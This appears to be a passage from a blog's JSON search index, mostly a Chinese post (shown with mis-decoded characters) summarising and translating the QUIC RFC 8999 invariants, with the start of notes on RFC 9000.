sync.Mutex outgoingBidiStreams *outgoingBidiStreamsMap outgoingUniStreams *outgoingUniStreamsMap incomingBidiStreams *incomingBidiStreamsMap incomingUniStreams *incomingUniStreamsMap reset bool } ","description":"","id":9,"section":"posts","tags":["network","http3"],"title":"quic-goåº“æºç é˜…è¯»","uri":"https://ruokeqx.gitee.io/posts/quic-go_source/"},{"content":"ç®€å•çœ‹äº†ä»¥ä¸‹å‡ ä¸ªQUICå’ŒHTTP3ç›¸å…³RFCæ–‡æ¡£ï¼Œå¯¹å…¶è®¾è®¡æœ‰äº†ä¸€å®šäº†è§£ã€‚\nRFC8999: Version-Independent Properties of QUIC\nRFC9000: QUIC: A UDP-Based Multiplexed and Secure Transport\nRFC9114: HTTP/3\nRFC9204: QPACK: Field Compression for HTTP/3\nRFC8999 RFC8999ååˆ†ç®€å• ç”šè‡³æ¯”ä¸€äº›ç®€çŸ­çš„è®ºæ–‡è¿˜è¦çŸ­ï¼Œä»–çš„ç›®å½•ä¹Ÿååˆ†ç®€å•ï¼Œæ¯•ç«Ÿåªæ˜¯å®šä¹‰äº†QUICåè®®çš„ä¸€äº›é€šè¯†ä¿¡æ¯ã€‚\nå†…å®¹ä¸å¤šï¼Œæœ€å…³é”®çš„å°±æ˜¯æè¿°äº†ä¸€ä¸ªé•¿åŒ…çŸ­åŒ…ï¼ŒIDå’Œç‰ˆæœ¬åŠç‰ˆæœ¬åå•†ç›¸å…³å†…å®¹ã€‚å…¶ä¸­å®šä¹‰ç»“æ„é€šè¿‡è§‚å¯Ÿæµé‡åŒ…å†…å®¹å¯ä»¥å¾—åˆ°éªŒè¯\nä¸Šé¢æŠ“åˆ°çš„Version idéƒ½æ˜¯1ï¼ŒåŸºäºRFC9000å®ç°ã€‚æŸ¥çœ‹Wiresharkæºç [wireshark/epan/dissectors/packet-quic.c](epan/dissectors/packet-quic.c Â· master Â· Wireshark Foundation / wireshark Â· GitLab)å¯ä»¥çœ‹åˆ°å…¶å®å·²ç»æœ‰å¾ˆå¤šå…¬å¸å†…éƒ¨å®ç°çš„åè®®ç‰ˆæœ¬äº†ã€‚\nä»¥ä¸‹æ˜¯åŸæ–‡å†…å®¹\n1. QUICçš„ä¸€ä¸ªé«˜åº¦æŠ½è±¡çš„æè¿° QUIC æ˜¯ä¸¤ä¸ªç«¯ç‚¹ä¹‹é—´çš„é¢å‘è¿æ¥çš„åè®®ã€‚ è¿™äº›ç«¯ç‚¹äº¤æ¢ UDP æ•°æ®æŠ¥ã€‚ è¿™äº› UDP æ•°æ®æŠ¥åŒ…å« QUIC æ•°æ®åŒ…ã€‚ QUIC ç«¯ç‚¹ä½¿ç”¨ QUIC æ•°æ®åŒ…æ¥å»ºç«‹ QUIC è¿æ¥ï¼Œè¿™æ˜¯è¿™äº›ç«¯ç‚¹ä¹‹é—´çš„å…±äº«åè®®çŠ¶æ€ã€‚\n2. æ‰€æœ‰QUICç‰ˆæœ¬å›ºå®šçš„å±æ€§ é™¤äº†æä¾›å®‰å…¨ã€å¤šè·¯å¤ç”¨çš„ä¼ è¾“åŠŸèƒ½ï¼ŒQUICã€ŠQUICåè®®ã€‹è¿˜æ”¯æŒç‰ˆæœ¬åå•†ã€‚è¿™å°†ä½¿å¾—åè®®èƒ½å¤Ÿåœ¨ä»¥åçš„å²æœˆä¸­ä¸ºé€‚åº”æ–°çš„éœ€æ±‚è€Œæ›´æ–°ï¼Œè€Œåè®®çš„è¯¸å¤šç‰¹æ€§å¯ä»¥éšç€ç‰ˆæœ¬çš„è¿­ä»£è€Œä¸æ–­æ”¹å˜ã€‚\næœ¬æ–‡é˜è¿°QUICçš„ä¸€äº›åœ¨æ–°çš„QUICç‰ˆæœ¬å¼€å‘åŠéƒ¨ç½²çš„è¿‡ç¨‹ä¸­ä¾æ—§ä¿æŒä¸å˜çš„å±æ€§ã€‚æ‰€æœ‰è¿™äº›ä¸å˜å±æ€§éƒ½ä¸IPç‰ˆæœ¬æ— å…³ã€‚\næœ¬æ–‡çš„ä¸»è¦ç›®æ ‡æ˜¯ç¡®ä¿åç»­QUICæ–°ç‰ˆæœ¬çš„è¿­ä»£ã€‚é€šè¿‡é™ˆè¿°QUICçš„è¿™äº›ä¸å¯æ›´æ”¹çš„å±æ€§ï¼Œæœ¬æ–‡è¯•å›¾ç»´æŒQUICç»ˆç«¯å¯¹QUICåè®®ä»»ä½•å…¶ä»–æ–¹é¢çš„æ”¹åŠ¨è¿›è¡Œåå•†çš„èƒ½åŠ›ã€‚å› æ­¤ï¼Œè¿™ä¹Ÿä¿è¯äº†æš´éœ²åˆ°ä¸€æ¡QUICè¿æ¥ä¸¤ä¸ªç»ˆç«¯ä¹‹å¤–çš„ä¿¡æ¯é‡æœ€å°‘ã€‚QUICåè®®åœ¨æœ¬æ–‡æ˜ç¡®ç¦æ­¢ä¹‹å¤–çš„ä»»ä½•æ–¹é¢ï¼Œéƒ½æ˜¯å¯ä»¥åœ¨ä¸åŒç‰ˆæœ¬ä¹‹é—´ä¿®æ”¹çš„ã€‚\né™„å½•AåŒ…å«ä¸€ä»½éè¯¦å°½çš„æ¸…å•ï¼Œåˆ—å‡ºäº†ä¸€äº›åŸºäºå¯¹QUICç‰ˆæœ¬1çš„äº†è§£å¯èƒ½åšå‡ºçš„ä¸æ­£ç¡®çš„çŒœæƒ³ï¼Œè¿™äº›ä¸é€‚ç”¨äºQUICçš„ä»»ä½•ç‰ˆæœ¬ã€‚\n3. è§„çº¦åŠå®šä¹‰ 4. æ ‡å‡†è§„èŒƒ å¤æ‚çš„å­—æ®µè¢«å‘½ååï¼Œç”±ç´§éšå‘½åçš„ä¸€ä¸ªä»¥ä¸€å¯¹èŠ±æ‹¬å·æ‹¬èµ·æ¥çš„å­—æ®µåˆ—è¡¨æè¿°ï¼Œåˆ—è¡¨ä¸­çš„å­—æ®µä»¥é€—å·åˆ†éš”ã€‚\nå•ä¸ªå­—æ®µåŒ…æ‹¬é•¿åº¦ä¿¡æ¯ã€å¸¦æ­£å·çš„å®šå€¼ã€å¯é€‰å€¼æˆ–æœ¬å­—æ®µçš„å‰¯æœ¬ã€‚å•ä¸ªå­—æ®µä½¿ç”¨ä¸‹è¿°æ ‡å‡†è§„èŒƒï¼Œä¸”æ‰€æœ‰é•¿åº¦éƒ½ä»¥æ¯”ç‰¹ä¸ºå•ä½ï¼š\nx (A): è¡¨ç¤ºxæ˜¯Aæ¯”ç‰¹é•¿åº¦\nx (A..B): è¡¨ç¤ºxçš„é•¿åº¦å¯ä»¥æ˜¯ä»Aåˆ°Bçš„æ‰€æœ‰å€¼ï¼Œçœç•¥Aè¡¨ç¤ºæœ€å°é›¶ä½ï¼Œå¹¶ä¸”çœç•¥Bè¡¨ç¤ºæ²¡æœ‰è®¾ç½®ä¸Šé™ã€‚è¿™ç§æ ¼å¼çš„å€¼æ€»æ˜¯ä»¥å­—ç¬¦è¾¹ç•Œç»“æŸã€‚\nx (L) = C: è¡¨ç¤ºxæœ‰ä¸€ä¸ªå®šå€¼Cï¼Œä¸”xçš„é•¿åº¦ä¸ºLï¼ŒLå¯ä»¥ç”¨ä¸Šè¿°ä»»ä½•é•¿åº¦æ ¼å¼\nx (L) ...: è¡¨ç¤ºxé‡å¤0æ¬¡æˆ–ä»¥ä¸Šæ¬¡æ•°ï¼Œä¸”æ¯ä¸ªå®ä¾‹é•¿åº¦ä¸ºL\næœ¬æ–‡ä½¿ç”¨ç½‘ç»œå­—èŠ‚åº(å¤§ç«¯åº)\nç¤ºä¾‹ç»“æ„ï¼š\n1 2 3 4 5 6 7 Example Structure { One-bit Field (1), 7-bit Field with Fixed Value (7) = 61, Arbitrary-Length Field (..), Variable-Length Field (8..24), Repeated Field (8) ..., } 5. QUIC Packets QUCIç»ˆç«¯ä¹‹é—´äº¤æ¢åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªQUICæ•°æ®åŒ…çš„UDPæŠ¥æ–‡ã€‚æœ¬ç« æè¿°QUICåŒ…çš„ä¸å˜ç‰¹æ€§ã€‚ä¸€ä¸ªç‰ˆæœ¬çš„QUICå‡†è®¸å¤šä¸ªQUICæ•°æ®åŒ…åŒ…å«äºåŒä¸€ä¸ªUDPæŠ¥æ–‡é‡Œï¼Œä½†æ˜¯å…¶ä¸å˜çš„ç‰¹æ€§åªè¦æ±‚æŠ¥æ–‡é‡Œçš„é¦–ä¸ªæ•°æ®åŒ…ä¿æŒã€‚\nQUICå®šä¹‰äº†ä¸¤ç±»æ•°æ®åŒ…å¤´ï¼šé•¿åŒ…å¤´ä¸çŸ­åŒ…å¤´ã€‚æœ‰é•¿åŒ…å¤´çš„æ•°æ®åŒ…ç”±å…¶é¦–ä¸ªå­—èŠ‚çš„é¦–ä¸ªæ¯”ç‰¹ä½è®¾ç½®ä¸º1åˆ¤å®šï¼Œè€ŒçŸ­åŒ…å¤´æ•°æ®åŒ…è¿™ä¸ªæ¯”ç‰¹ä½è®¾ç½®ä¸º0ã€‚\nQUICæ•°æ®åŒ…å¯èƒ½è¢«å®Œå…¨ä¿æŠ¤ï¼ŒåŒ…æ‹¬åŒ…å¤´ã€‚ç„¶è€Œï¼ŒQUICç‰ˆæœ¬åå•†åŒ…ä¸ä¼šè¢«å®Œå…¨ä¿æŠ¤ï¼Œè¯¦è§ç¬¬6ç« ã€‚\né™¤äº†è¿™é‡Œæè¿°çš„å€¼ä¹‹å¤–ï¼ŒQUICæ•°æ®åŒ…çš„æœ‰æ•ˆè´Ÿè½½æ˜¯ç”±å„ä¸ªç‰ˆæœ¬å†³å®šä¸”ä»»æ„é•¿åº¦çš„ã€‚\n5.1 é•¿Header é•¿Headeræ ¼å¼\n1 2 3 4 5 6 7 8 9 10 Long Header Packet { Header Form (1) = 1, Version-Specific Bits (7), Version (32), Destination Connection ID Length (8), Destination Connection ID (0..2040), Source Connection ID Length (8), Source Connection ID (0..2040), Version-Specific Data (..), } QUICé•¿åŒ…å¤´æ•°æ®åŒ…å…¶é¦–å­—èŠ‚æœ€é«˜æ¯”ç‰¹ä½è®¾ç½®ä¸º1ï¼Œå…¶ä½™æ¯”ç‰¹ä½åˆ™è§†å…·ä½“ç‰ˆæœ¬è€Œå®šã€‚\néšåçš„å››ä¸ªå­—èŠ‚åŒ…å«ä¸€ä¸ª32ä½ç‰ˆæœ¬å­—æ®µï¼Œå…³äºç‰ˆæœ¬è¯¦è§ç¬¬5.4ç« ã€‚\næ¥ä¸‹æ¥çš„ä¸€ä¸ªå­—èŠ‚åŒ…å«ç´§éšå…¶åçš„ç›®æ ‡è¿æ¥IDå­—æ®µçš„é•¿åº¦ï¼Œä¸”è¯¥é•¿åº¦å€¼ä»¥å­—èŠ‚è®¡æ•°ï¼Œå¹¶è¢«ç¼–ç ä¸ºä¸€ä¸ª8ä½æ— ç¬¦å·æ•´æ•°ã€‚ç›®æ ‡è¿æ¥IDå­—æ®µç´§éšç›®æ ‡è¿æ¥IDé•¿åº¦å­—æ®µï¼Œå…¶é•¿åº¦åœ¨0åˆ°255å­—èŠ‚ä¹‹é—´ã€‚è¿æ¥IDè¯¦è§ç¬¬5.3ç« ã€‚\næ¥ä¸‹æ¥çš„ä¸€ä¸ªå­—èŠ‚åŒ…å«ç´§éšå…¶åçš„æºè¿æ¥IDå­—æ®µçš„é•¿åº¦ï¼Œä¸”è¯¥é•¿åº¦å€¼ä»¥å­—èŠ‚è®¡æ•°ï¼Œå¹¶è¢«ç¼–ç ä¸ºä¸€ä¸ª8ä½æ— ç¬¦å·æ•´æ•°ã€‚æºè¿æ¥IDå­—æ®µç´§éšæºè¿æ¥IDé•¿åº¦å­—æ®µï¼Œå…¶é•¿åº¦åœ¨0-255å­—èŠ‚ä¹‹é—´ã€‚\næ•°æ®åŒ…æ¥ä¸‹æ¥å‰©ä½™å­—æ®µåŒ…å«ä¸QUICç‰ˆæœ¬ç‰¹å®šç›¸å…³çš„å†…å®¹ã€‚\n5.2 çŸ­Header çŸ­Headeræ ¼å¼\n1 2 3 4 5 6 Short Header Packet { Header Form (1) = 0, Version-Specific Bits (7), Destination Connection ID (..), Version-Specific Data (..), } çŸ­åŒ…å¤´QUICæ•°æ®åŒ…çš„é¦–å­—èŠ‚çš„æœ€é«˜ä½è®¾ç½®ä¸º0ã€‚\nçŸ­åŒ…å¤´æ•°æ®åŒ…ç´§éšé¦–å­—èŠ‚ä¹‹åæ˜¯ä¸€ä¸ªç›®æ ‡è¿æ¥IDã€‚çŸ­åŒ…å¤´ä¸ä¼šåŒ…å«ç›®æ ‡è¿æ¥IDé•¿åº¦ã€æºè¿æ¥IDé•¿åº¦ã€æºè¿æ¥IDæˆ–ç‰ˆæœ¬å­—æ®µã€‚ç›®æ ‡è¿æ¥IDçš„é•¿åº¦ä¸ä¼šç¼–ç åœ¨çŸ­åŒ…å¤´æ•°æ®åŒ…é‡Œï¼Œä¹Ÿä¸ä¼šå—é™äºè¿™ä¸ªç‰¹æ€§ã€‚\næ•°æ®åŒ…æ¥ä¸‹æ¥å‰©ä½™å­—æ®µæœ‰ä¸ç‰ˆæœ¬ç‰¹å®šç›¸å…³çš„è¯­ä¹‰ã€‚\n5.3 è¿æ¥ID è¿æ¥IDæ˜¯ä¸€ä¸ªä»»æ„é•¿åº¦çš„ä¸é€æ˜å­—æ®µã€‚\nè¿æ¥IDçš„ä¸»è¦åŠŸèƒ½æ˜¯ç¡®ä¿åº•å±‚åè®®ï¼ˆUDPã€IPåŠæ›´åº•å±‚çš„åè®®æ ˆï¼‰å‘ç”Ÿåœ°å€å˜æ›´æ—¶ä¸ä¼šå¯¼è‡´ä¸€ä¸ªQUICè¿æ¥çš„æ•°æ®åŒ…è¢«ä¼ è¾“åˆ°é”™è¯¯çš„QUICç»ˆç«¯ä¸Šã€‚è¿æ¥IDç”±ç»ˆç«¯åŠæ”¯æŒçš„ä¸­é—´è®¾å¤‡ç”¨ä»¥ç¡®ä¿æ¯ä¸ªæ•°æ®åŒ…èƒ½å¤Ÿè¢«è°ƒåº¦åˆ°ç›¸åº”ç»ˆç«¯çš„æ­£ç¡®å®ä½“ä¸Šã€‚å¯¹äºç»ˆç«¯è€Œè¨€ï¼Œè¿æ¥IDç”¨äºæ ‡è¯†æ•°æ®åŒ…å¯¹åº”çš„QUICè¿æ¥ã€‚\nè¿æ¥IDç”±æ¯ä¸ªç»ˆç«¯æ ¹æ®ç‰ˆæœ¬ç‰¹å®šçš„æ–¹å¼é€‰æ‹©ï¼Œè€ŒåŒä¸€ä¸ªQUICè¿æ¥çš„æ•°æ®åŒ…å¯èƒ½ä½¿ç”¨ä¸åŒçš„è¿æ¥IDã€‚\n5.4 ç‰ˆæœ¬ ç‰ˆæœ¬å­—æ®µåŒ…å«ä¸€ä¸ª4å­—èŠ‚æ ‡è¯†ç¬¦ã€‚è¯¥å€¼å¯ä¾›ç»ˆç«¯ç”¨ä»¥æ ‡è¯†ä¸€ä¸ªQUICç‰ˆæœ¬ã€‚å€¼ä¸º0x00000000çš„ç‰ˆæœ¬å­—æ®µä¿ç•™ç»™ç‰ˆæœ¬åå•†ä½¿ç”¨ï¼Œè¯¦è§ç¬¬6ç« ï¼Œè€Œä»»ä½•å…¶ä½™å€¼å‡å¯èƒ½æœ‰æ•ˆã€‚\næœ¬æ–‡æè¿°çš„å±æ€§é€‚ç”¨äºæ‰€æœ‰ç‰ˆæœ¬çš„QUICã€‚ä¸ç¬¦åˆæœ¬æ–‡æ‰€è¿°å±æ€§çš„åè®®ä¸æ˜¯QUICåè®®ã€‚åç»­æ–‡æ¡£å¯ä»¥ç»™æŸä¸ªç‰¹å®šQUICç‰ˆæœ¬æˆ–ä¸€ç³»åˆ—QUICç‰ˆæœ¬å¢åŠ å…¶ä»–çš„å±æ€§ã€‚\n6. ç‰ˆæœ¬åå•† QUICç»ˆç«¯æ”¶åˆ°ä¸€ä¸ªå¸¦é•¿åŒ…å¤´çš„æ•°æ®åŒ…åŠä¸€ä¸ªå…¶ä¸èƒ½ç†è§£æˆ–ä¸æ”¯æŒçš„ç‰ˆæœ¬æ—¶ï¼Œå°±å¯èƒ½å›å¤ä¸€ä¸ªç‰ˆæœ¬åå•†åŒ…ã€‚çŸ­åŒ…å¤´æ•°æ®åŒ…ä¸ä¼šè§¦å‘ç‰ˆæœ¬åå•†ã€‚\nç‰ˆæœ¬åå•†åŒ…è®¾ç½®ä¸Šé¦–ä¸ªå­—èŠ‚çš„é«˜ä½ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒæ˜¯ä¸€ä¸ªåœ¨ç¬¬5.1ç« å®šä¹‰çš„é•¿åŒ…å¤´æ•°æ®åŒ…ã€‚ç‰ˆæœ¬åå•†åŒ…å¯ä»¥é€šè¿‡å…¶ç‰ˆæœ¬å­—æ®µè¯†åˆ«ï¼Œå› ä¸ºè¿™ä¸ªå­—æ®µä¼šè¢«è®¾ç½®ä¸º0x00000000ã€‚\nç‰ˆæœ¬åå•†åŒ…\n1 2 3 4 5 6 7 8 9 10 Version Negotiation Packet { Header Form (1) = 1, Unused (7), Version (32) = 0, Destination Connection ID Length (8), Destination Connection ID (0..2040), Source Connection ID Length (8), Source Connection ID (0..2040), Supported Version (32) ..., } ç‰ˆæœ¬åå•†åŒ…åªæœ‰é¦–å­—èŠ‚æœ€é‡è¦çš„é‚£ä¸ªæ¯”ç‰¹ä½æœ‰ç€ä»»æ„å®šä¹‰çš„å€¼ã€‚å…¶å‰©ä½™çš„7ä¸ªæ¯”ç‰¹ä½æ ‡è®°ä¸ºâ€œæœªä½¿ç”¨â€ï¼Œåœ¨å‘é€çš„æ—¶å€™å¯ä»¥è¢«è®¾ç½®ä¸ºä»»æ„å€¼ï¼Œä¸”å¿…é¡»è¢«æ¥æ”¶ç«¯å¿½ç•¥ã€‚\nç‰ˆæœ¬åå•†åŒ…ç´§éšæºè¿æ¥IDå­—æ®µåé¢çš„æ˜¯ä¸€ä¸ªæ”¯æŒç‰ˆæœ¬å­—æ®µçš„åˆ—è¡¨ï¼Œè¯¥åˆ—è¡¨æ¯ä¸ªå­—æ®µæ ‡è¯†ç»ˆç«¯èƒ½å¤Ÿæ”¯æŒçš„ç‰ˆæœ¬ï¼ˆä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯æ”¯æŒçš„QUICç‰ˆæœ¬çš„ç‰ˆæœ¬å·æŒ¨ä¸ªåˆ—ä¸‹å»ï¼‰ã€‚ç‰ˆæœ¬åå•†åŒ…ä¸åŒ…å«å…¶ä»–å­—æ®µï¼Œç»ˆç«¯å¿…é¡»å¿½ç•¥ä¸åŒ…å«æ”¯æŒç‰ˆæœ¬å­—æ®µæˆ–åŒ…å«ä¸å®Œæ•´ç‰ˆæœ¬å€¼çš„åŒ…ã€‚\nç‰ˆæœ¬åå•†åŒ…ä¸ä½¿ç”¨å®Œå…¨çš„æˆ–åŠ å¯†çš„ä¿æŠ¤ã€‚æŸäº›ç‰¹å®šçš„QUICç‰ˆæœ¬å¯èƒ½åŒ…å«å‡†è®¸ç»ˆç«¯é‰´åˆ«æ”¯æŒç‰ˆæœ¬åˆ—è¡¨é‡Œçš„å€¼æ˜¯å¦å­˜åœ¨ä¿®æ”¹æˆ–æŸåçš„åè®®æ‰‹æ®µã€‚\nç»ˆç«¯å¿…é¡»åœ¨å…¶ç›®æ ‡è¿æ¥IDå­—æ®µåŒ…å«å®ƒæ”¶åˆ°çš„æ•°æ®åŒ…çš„æºè¿æ¥IDå€¼ã€‚å¿…é¡»å°†æ”¶åˆ°æ•°æ®åŒ…çš„ç›®æ ‡è¿æ¥IDå­—æ®µå€¼å¤åˆ¶ç»™æºè¿æ¥IDå­—æ®µï¼Œè¯¥å€¼æ˜¯å®¢æˆ·ç«¯éšæœºäº§ç”Ÿçš„ã€‚å›æ˜¾ä¸¤ä¸ªè¿æ¥IDç»™å®¢æˆ·ç«¯ä¸€äº›ä¿è¯ï¼Œè¡¨æ˜æœåŠ¡ç«¯æ”¶åˆ°äº†åŒ…ï¼Œä¸”ç‰ˆæœ¬åå•†åŒ…ä¸æ˜¯ç”±å¯¹å…¶ä¸å¯è§çš„æ”»å‡»è€…ç”Ÿæˆçš„ã€‚\nç»ˆç«¯æ”¶åˆ°ç‰ˆæœ¬åå•†åŒ…åï¼Œå¯ä»¥åœ¨éšåçš„æ•°æ®åŒ…ä¸­æ›´æ”¹QUICç‰ˆæœ¬ã€‚ç»ˆç«¯æ›´æ”¹QUICç‰ˆæœ¬çš„æ¡ä»¶å°†å–å†³äºå…¶é€‰æ‹©çš„ç‰ˆæœ¬ã€‚\nã€ŠQUICåè®®ã€‹è¯¦ç»†æè¿°äº†æ”¯æŒQUICç‰ˆæœ¬1çš„ç»ˆç«¯å¦‚ä½•åˆ›å»ºåŠå¤„ç†ä¸€ä¸ªç‰ˆæœ¬åå•†åŒ…ã€‚\n7. å®‰å…¨åŠéšç§è€ƒé‡ ä¸­é—´ä»¶å¯èƒ½èƒ½å¤Ÿè¯†åˆ«ç‰¹å®šç‰ˆæœ¬çš„QUICçš„ä¸€äº›ç‰¹æ€§ï¼Œå¹¶å‡è®¾å…¶ä»–ç‰ˆæœ¬çš„QUICè¡¨ç°å‡ºç±»ä¼¼ç‰¹å¾æ—¶ï¼Œå…¶åº•å±‚æ­£åœ¨è¡¨è¾¾ä¸€è‡´çš„è¯­ä¹‰ã€‚è¿™æ ·çš„ç‰¹æ€§æœ‰å¥½å‡ ä¸ªï¼Œè¯¦è§é™„å½•Aã€‚QUICç‰ˆæœ¬1å·²ç»åšäº†ä¸€äº›å·¥ä½œæ¶ˆé™¤æˆ–éšè—ä¸€äº›å¯è§çš„ç‰¹å¾ï¼Œä½†æ˜¯è®¸å¤šè¿™æ ·çš„ç‰¹æ€§ä»ç„¶ç»´æŒç°çŠ¶ã€‚åç»­å…¶ä»–QUICç‰ˆæœ¬å¯èƒ½æ”¹å˜è®¾è®¡ä»è€Œè¡¨ç°å‡ºä¸åŒçš„ç‰¹å¾ã€‚\nQUICç‰ˆæœ¬å·ä¸ä¼šå‡ºç°åœ¨æ‰€æœ‰QUICæ•°æ®åŒ…ä¸­ï¼Œè¿™æ„å‘³ç€ä»¥ä¸€ä¸ªåŸºäºç‰ˆæœ¬çš„ç‰¹å¾ä»ä¸€æ¡æµä¸­å¯é åœ°æå–ä¿¡æ¯éœ€è¦ä¸­é—´ä»¶ä¸ºæ¯ä¸ªè¿æ¥IDä¿ç•™çŠ¶æ€ã€‚\næœ¬æ–‡æ‰€è¿°ç‰ˆæœ¬åå•†åŒ…ä¸ä¼šè¢«å®Œæ•´ä¿æŠ¤ï¼Œä»…ä»…å¯¹æ”»å‡»è€…çš„ä»‹å…¥åšäº†é€‚åº¦ä¿æŠ¤ã€‚å¦‚æœç»ˆç«¯è¯•å›¾æ”¹ç”¨ä¸åŒçš„QUICç‰ˆæœ¬ï¼Œé‚£ä¹ˆå®ƒå¿…é¡»éªŒè¯ç‰ˆæœ¬åå•†åŒ…çš„è¯­ä¹‰å†…å®¹ã€‚\né™„å½•Aï¼šä¸æ­£ç¡®çš„çŒœæƒ³ QUICç‰ˆæœ¬1ã€ŠQUICåè®®ã€‹æœ‰ä¸€ç³»åˆ—ç‰¹æ€§æ²¡æœ‰è¢«ä¿æŠ¤ä¸ºå¤–éƒ¨ä¸å¯è§ï¼Œä½†æ˜¯ä¸€èˆ¬è®¤ä¸ºå¯ä»¥åœ¨åç»­çš„QUICç‰ˆæœ¬ä¸­æ›´æ”¹ã€‚\næœ¬ç« åˆ—å‡ºäº†åŸºäºQUICç‰ˆæœ¬1çš„äº†è§£å¯èƒ½åšå‡ºçš„ä¸€äº›é”™è¯¯çŒœæƒ³ï¼Œå…¶ä¸­ä¸€äº›é™ˆè¿°ç”šè‡³å¯¹QUICç‰ˆæœ¬1ä¹Ÿæ˜¯é”™è¯¯çš„ã€‚è¿™ä¸ªåˆ—ä¸¾å¹¶ä¸å……åˆ†ï¼Œç›®çš„åœ¨äºåšä¸€äº›é˜è¿°ã€‚\nå¯¹äºä¸€ä¸ªQUICç‰ˆæœ¬ï¼Œä¸‹è¿°ä»»æ„ä¸€æ¡ç”šè‡³æ‰€æœ‰çš„é™ˆè¿°éƒ½å¯èƒ½æ˜¯é”™çš„ï¼š\nQUICä½¿ç”¨TLSã€ŠQUIC TLSã€‹ï¼Œè€Œé“¾è·¯ä¸Šä¸€äº›TLSçš„ä¿¡æ¯æ˜¯å¯è§çš„ã€‚ QUICé•¿åŒ…å¤´åªåœ¨è¿æ¥å»ºç«‹é˜¶æ®µå‘ç”Ÿæ›´æ”¹ã€‚ äº”å…ƒç»„ä¸Šçš„æ¯æ¡æµéƒ½ä¼šåŒ…å«ä¸€ä¸ªè¿æ¥å»ºç«‹è¿‡ç¨‹ã€‚ ä¸€æ¡æµçš„å‰å‡ ä¸ªåŒ…ä½¿ç”¨é•¿åŒ…å¤´ã€‚ åœ¨ä¸€æ®µé•¿æ—¶é—´çš„é™é»˜å‰çš„æœ€åä¸€ä¸ªåŒ…åªåŒ…å«ä¸€ä¸ªç¡®è®¤ä¿¡æ¯ã€‚ QUICä½¿ç”¨å…³è”æ•°æ®åŠ å¯†è®¤è¯ï¼ˆAEADï¼‰å‡½æ•°ï¼ˆAEAD_AES_128_GCMï¼Œè¯¦è§RFC5116ä¿æŠ¤åœ¨è¿æ¥å»ºç«‹é˜¶æ®µäº¤æ¢çš„æ•°æ®åŒ…ã€‚ QUICæ•°æ®åŒ…å·æ˜¯åŠ å¯†çš„ï¼Œä¸”æ˜¯æ•°æ®åŒ…çš„åˆå§‹åŠ å¯†å­—èŠ‚ã€‚ QUICæ•°æ®åŒ…å·æ¯å‘é€ä¸€ä¸ªåŒ…é€’å¢1ã€‚ å®¢æˆ·ç«¯å‘é€çš„é¦–ä¸ªQUICæ¡æ‰‹åŒ…ä¸èƒ½å°äºä¸€ä¸ªç‰¹å®šå°ºå¯¸ã€‚ QUICè§„å®šå®¢æˆ·ç«¯å‘é€ç¬¬ä¸€ä¸ªåŒ…ã€‚ QUICæ•°æ®åŒ…é¦–å­—èŠ‚çš„ç¬¬äºŒä¸ªæ¯”ç‰¹ä½æ€»æ˜¯è®¾ç½®ä¸º1çš„ï¼ˆ0x40ï¼‰ã€‚ QUICç‰ˆæœ¬åå•†åŒ…åªä¼šç”±æœåŠ¡ç«¯å‘å‡ºã€‚ QUICè¿æ¥IDå¾ˆå°‘å‘ç”Ÿæ”¹å˜ã€‚ QUICç»ˆç«¯ä¼šåœ¨å‘é€å®Œä¸€ä¸ªç‰ˆæœ¬åå•†åŒ…åæ”¹å˜QUICç‰ˆæœ¬ã€‚ QUICé•¿åŒ…å¤´çš„ç‰ˆæœ¬å­—æ®µåœ¨ä¸¤ä¸ªæ–¹å‘ä¸Šéƒ½æ˜¯ä¸€æ ·çš„ã€‚ QUICåŒ…ç‰ˆæœ¬å­—æ®µæœ‰ä¸€ä¸ªä»£è¡¨æŸQUICç‰ˆæœ¬çš„å€¼æ„å‘³ç€è¿æ¥ç”¨çš„å°±æ˜¯ç›¸åº”çš„QUICç‰ˆæœ¬ã€‚ ä»»ä½•ä¸€å¯¹QUICç»ˆç«¯ä¹‹é—´ä¸€æ¬¡åªæœ‰ä¸€ä¸ªQUICè¿æ¥å»ºè”ã€‚ RFC9000 QUICæ˜¯ä¸€ä¸ªé¢å‘è¿æ¥çš„åè®®ï¼Œåœ¨å®¢æˆ·ç«¯åŠæœåŠ¡ç«¯ä¹‹é—´å»ºç«‹æœ‰çŠ¶æ€çš„äº¤äº’ã€‚\nQUICæ¡æ‰‹ç”±å¯†é’¥åå•†åŠä¼ è¾“å‚æ•°åå•†ç»„æˆã€‚QUICé›†æˆäº†TLSæ¡æ‰‹ã€ŠTLS 1.3ã€‹ï¼ŒåŒæ—¶ä»¥è‡ªå®šä¹‰çš„å¸§ä¿æŠ¤æ•°æ®åŒ…ã€‚æ›´å¤šå…³äºTLSä¸QUICé›†æˆçš„ç»†èŠ‚æè¿°è¯¦è§ã€ŠQUIC-TLSã€‹ã€‚æ¡æ‰‹è¿‡ç¨‹è¢«è®¾è®¡æˆæ”¯æŒå°½æ—©äº¤æ¢åº”ç”¨æ•°æ®ï¼ˆ0-RTTï¼‰ï¼ŒåŒ…å«ä¸€ä¸ªéœ€è¦é€šè¿‡æŸç§å½¢å¼çš„æå‰äº¤æµæˆ–é…ç½®æ¥å¼€å¯çš„å®¢æˆ·ç«¯é€‰é¡¹ã€‚\nç»ˆç«¯é€šè¿‡QUICäº¤æµæ˜¯ä»¥äº¤äº’QUICæ•°æ®åŒ…çš„å½¢å¼å®ç°çš„ã€‚å¤§å¤šæ•°æ•°æ®åŒ…è£…è½½ç€ä¸€ä¸ªæˆ–å¤šä¸ªåœ¨ç»ˆç«¯é—´æ¬è¿æ§åˆ¶ä¿¡æ¯å’Œåº”ç”¨æ•°æ®çš„å¸§ã€‚QUICä¼šéªŒè¯æ¯ä¸ªåŒ…çš„å†…å®¹ï¼Œå¹¶æ ¹æ®å®é™…æƒ…å†µå¯¹æ¯ä¸ªæ•°æ®åŒ…è¿›è¡ŒåŠ å¯†ã€‚QUICæ•°æ®åŒ…é€šè¿‡UDPæŠ¥æ–‡ã€ŠUDPã€‹ä¼ 